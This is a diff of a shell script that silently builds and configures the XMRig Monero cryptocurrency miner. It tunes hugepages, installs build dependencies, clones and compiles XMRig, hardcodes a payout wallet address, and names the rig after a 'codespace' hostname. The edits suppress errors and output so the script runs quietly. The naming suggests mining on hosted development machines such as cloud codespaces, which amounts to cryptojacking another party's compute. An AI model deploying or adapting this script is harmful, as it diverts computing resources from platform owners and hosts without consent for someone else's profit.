@@ -27,27 +27,27 @@ fi
 AVAILABLE_KB=$((MEMTOTAL_KB > RESERVE_KB ? MEMTOTAL_KB - RESERVE_KB : 0))
 HUGEPAGES=$((AVAILABLE_KB / 2048))
 if [ $HUGEPAGES -gt 0 ]; then
-    echo $HUGEPAGES | tee /proc/sys/vm/nr_hugepages > /dev/null
+    echo $HUGEPAGES | tee /proc/sys/vm/nr_hugepages > /dev/null 2>&1 || true
 fi
 # Enable hugepages (but only if not mobile, as it may not work well on Android)
 if [ "$IS_MOBILE" = false ]; then
-    echo always | tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null
-    echo always | tee /sys/kernel/mm/transparent_hugepage/defrag > /dev/null
+    echo always | tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1 || true
+    echo always | tee /sys/kernel/mm/transparent_hugepage/defrag > /dev/null 2>&1 || true
 fi
 RIG_NAME="codespace-$(hostname)-$(date +%s)"
-apt update -y > /dev/null 2>&1
-apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
+apt update -y > /dev/null 2>&1 || true
+apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 || true
 cd ~
-[ ! -d "xmrig" ] && git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1
-cd xmrig
+[ ! -d "xmrig" ] && git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1 || true
+cd xmrig || exit 1
 mkdir -p build && cd build
 # Build flags: Disable unnecessary features for mobile
 CMAKE_FLAGS="-DWITH_HWLOC=ON -DWITH_CN_GHOUL=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_BUILD_TYPE=Release"
 if [ "$IS_MOBILE" = true ]; then
     CMAKE_FLAGS="$CMAKE_FLAGS -DWITH_ASM=OFF" # Disable ASM on ARM for stability
 fi
-cmake .. $CMAKE_FLAGS > /dev/null
-make -j$CPU_CORES > /dev/null
+cmake .. $CMAKE_FLAGS > /dev/null 2>&1 || exit 1
+make -j$CPU_CORES > /dev/null 2>&1 || exit 1
 WALLET="42X98aXKvRm1H5CuJFMJP4XNvXPMLephkdF6yebtkJdja1UfnUKz2eaMqpNG2j81p9cVHubpQNuxHXSiFTPL85Jp8ByFcAY"
 # Generate config.json with dynamic settings
 cat > config.json <<EOL
